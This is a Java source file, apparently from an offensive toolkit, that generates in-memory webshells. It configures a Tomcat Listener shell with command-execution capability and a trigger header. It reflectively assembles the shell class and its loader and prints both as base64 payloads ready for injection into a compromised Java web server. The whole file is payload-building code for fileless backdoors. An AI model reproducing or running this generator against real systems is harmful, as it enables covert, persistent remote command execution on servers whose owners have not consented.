package com.ppp;

import com.ppp.annotation.Builder;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;
import com.ppp.annotation.Middleware;
import com.ppp.utils.maker.ClassUtils;
import com.ppp.utils.maker.Encoder;

import java.lang.reflect.Method;
import java.util.List;

/**
 * @author Whoopsunix
 * 内存马生成
 */
public class MemShellScheduler {
    private static String builderPackageName = "com.ppp.middleware.builder";
    private static String loaderPackageName = "com.ppp.middleware.loader";
    private static String msPackageName = "com.ppp.middleware.memshell";

    public static void main(String[] args) throws Exception {
        MemShellHelper memShellHelper = new MemShellHelper();
        memShellHelper.setMiddleware(Middleware.Tomcat);
        memShellHelper.setMemShell(MemShell.Listener);
        memShellHelper.setMemShellFunction(MemShellFunction.Runtime);

        // 内存马信息
        memShellHelper.setHEADER("xxx");


        build(memShellHelper);
    }

    public static byte[] build(MemShellHelper memShellHelper) throws Exception {
        String middleware = memShellHelper.getMiddleware();
        String memShell = memShellHelper.getMemShell();
        String memShellFunction = memShellHelper.getMemShellFunction();

        /**
         * 获取 Builder
         */
        Class loaderBuilderClass = null;
        Class msBuilderClass = null;

        List<Class<?>> builderClasses = ClassUtils.getClasses(builderPackageName);
        for (Class<?> clazz : builderClasses) {
            Builder builder = clazz.getAnnotation(Builder.class);
            if (builder == null) continue;

            Middleware middlewareAnnotation = clazz.getAnnotation(Middleware.class);
            if (middlewareAnnotation == null) continue;

            // 获取 Loader Builder
            if (builder.value().equals(Builder.Loader) && middlewareAnnotation.value().equals(middleware)) {
                loaderBuilderClass = clazz;
                Printer.blueInfo("Loader builder Class: " + clazz.getName() + ", Annotation Value: " + builder.value());
            }
            // 获取 MemShell Builder
            if (builder.value().equals(Builder.MS) && middlewareAnnotation.value().equals(middleware)) {
                msBuilderClass = clazz;
                Printer.blueInfo("MemShell builder Class: " + clazz.getName() + ", Annotation Value: " + builder.value());
            }
        }

        // 组件类型不存在
        if (loaderBuilderClass == null) {
            Printer.error("Loader builder Class Not Found");
            return null;
        }
        if (msBuilderClass == null) {
            Printer.error("MemShell builder Class Not Found");
            return null;
        }

        /**
         * 生成 Builder
         */

        Method msMethod = null;
        Method loaderMethod = null;

        Method[] msMethods = msBuilderClass.getDeclaredMethods();
        for (Method method : msMethods) {
            MemShell memShellAnnotation = method.getAnnotation(MemShell.class);
            if (memShellAnnotation == null) continue;

            if (memShellAnnotation.value().equals(memShell)) {
                msMethod = method;
                Printer.blueInfo("MS builder Method: " + method.getName() + ", Annotation Value: " + memShellAnnotation.value());
                break;
            }
        }

        Method[] loaderMethods = loaderBuilderClass.getDeclaredMethods();
        for (Method method : loaderMethods) {
            MemShell memShellAnnotation = method.getAnnotation(MemShell.class);
            if (memShellAnnotation == null) continue;

            if (memShellAnnotation.value().equals(memShell)) {
                loaderMethod = method;
                Printer.blueInfo("Loader builder Method: " + method.getName() + ", Annotation Value: " + memShellAnnotation.value());
                break;
            }
        }

        /**
         * 获取 Loader 和 MemShell
         */
        Class loaderClass = null;
        Class msClass = null;

        List<Class<?>> loaderClasses = ClassUtils.getClasses(loaderPackageName);
        for (Class<?> clazz : loaderClasses) {
            Middleware middlewareAnnotation = clazz.getAnnotation(Middleware.class);
            if (middlewareAnnotation == null) continue;
            if (middlewareAnnotation.value().equals(middleware)) {
                loaderClass = clazz;
                Printer.blueInfo("Loader Class: " + clazz.getName() + ", Annotation Value: " + middlewareAnnotation.value());
                break;
            }
        }

        List<Class<?>> msClasses = ClassUtils.getClasses(msPackageName);
        for (Class<?> clazz : msClasses) {
            MemShell memShellAnnotation = clazz.getAnnotation(MemShell.class);
            if (memShellAnnotation == null) continue;

            MemShellFunction memShellFunctionAnnotation = clazz.getAnnotation(MemShellFunction.class);
            if (memShellFunctionAnnotation == null) continue;

            if (memShellAnnotation.value().equals(memShell) && memShellFunctionAnnotation.value().equals(memShellFunction)) {
                msClass = clazz;
                Printer.blueInfo("MemShell Class: " + clazz.getName() + ", Annotation Value: " + memShellAnnotation.value());
                break;
            }
        }

        if (loaderClass == null) {
            Printer.error("Loader Class Not Found");
            return null;
        }
        if (msClass == null) {
            Printer.error("MemShell Class Not Found");
            return null;
        }


        /**
         * 生成 Loader 和 MemShell
         */
        Object loaderBuilder = loaderBuilderClass.newInstance();
        Object msBuilder = msBuilderClass.newInstance();

        byte[] msJavaClassBytes = (byte[]) msMethod.invoke(msBuilder, msClass, memShellHelper);
        String msJavaClassBase64 = Encoder.base64encoder(msJavaClassBytes);
        Printer.greenInfo("ms:");
        Printer.greenInfo(msJavaClassBase64);

        byte[] msLoaderJavaClassBytes = (byte[]) loaderMethod.invoke(loaderBuilder, loaderClass, msJavaClassBase64);
        String b64 = Encoder.base64encoder(msLoaderJavaClassBytes);
        Printer.greenInfo("ms+loader:");
        Printer.greenInfo(b64);

        return msLoaderJavaClassBytes;

    }

}
